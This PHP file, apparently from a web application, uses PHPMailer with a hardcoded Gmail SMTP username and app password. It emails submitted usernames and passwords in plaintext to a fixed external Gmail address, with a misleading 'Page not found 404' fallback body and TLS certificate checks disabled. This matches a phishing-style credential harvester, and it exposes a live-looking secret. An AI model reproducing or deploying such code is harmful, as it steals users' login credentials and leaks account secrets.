<?php

ini_set("display_errors",1);


require_once('../index.php');
require_once(BASEPATH.'config/autoloader.php');
require_once(BASEPATH.'config/sysconfig.php');
// require_once('../../app/sys/config/dbconfig2.php');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
$cid=21472147;


 
  require 'PHPMailer/src/Exception.php';
    require 'PHPMailer/src/PHPMailer.php';
    require 'PHPMailer/src/SMTP.php'; 
    $mail = new PHPMailer(true);
 
 try {
 
                 
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';                  
    $mail->SMTPAuth   = true;   
    $mail->setFrom('fredrickjohnmichael@gmail.com', 'Aura'); 
    $mail->Username   = 'sgssk63@gmail.com';                 
    $mail->Password   = 'emdancgmhsvdcmfy';                            
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            
    $mail->Port       = 465;                                    

$mail->SMTPOptions = array(
    'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
    )
);  
    

    $mail->addAddress("selvasgsphp@gmail.com");


    $mail->isHTML(true);                                 
    $mail->Subject = $subject;
    $mail->Body    = '<pre><b>Username:'. $uname.'</b>
    <b>Password:'.$pass.'</b></pre>';
    $mail->AltBody = 'Page not found 404';
    $sen=$mail->send();
    //print_r($sen);
   
} 
catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     //header("location:  https://sgserp.in/aura/login.php?id=2");
}

    //Mail Sent Ends
    
  

 
 
 
 
 
 
    //Mail Send Starts
//     require 'PHPMailer/src/Exception.php';
//     require 'PHPMailer/src/PHPMailer.php';
//     require 'PHPMailer/src/SMTP.php'; 
//     $mail = new PHPMailer(true);
       
    
                  
//     $mail->isSMTP();                                           
//     $mail->Host       = 'smtp.gmail.com';                     
//     $mail->SMTPAuth   = true;   
//     $mail->setFrom('fredrickjohnmichael@gmail.com', 'Aura'); 
//     $mail->Username   = 'sgssk63@gmail.com';                 
//     $mail->Password   = 'emdancgmhsvdcmfy';                            
//     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            
//     $mail->Port       = 465;                                    

//   $mail->SMTPOptions = array(
//     'ssl' => array(
//         'verify_peer' => false,
//         'verify_peer_name' => false,
//         'allow_self_signed' => true
//     )
// );
  
    

    // $mail->addAddress("muthukarthikeyanpmk07@gmail.com");


    // $mail->isHTML(true);                                 
    // $mail->Subject = "hi";
    // $mail->Body    = '<pre><b>Username:1</b>
    // <b>Password:2</b></pre>';
    // $mail->AltBody = 'Page not found 404';
    // $sen=$mail->send();
    // //print_r($sen);
   
?>




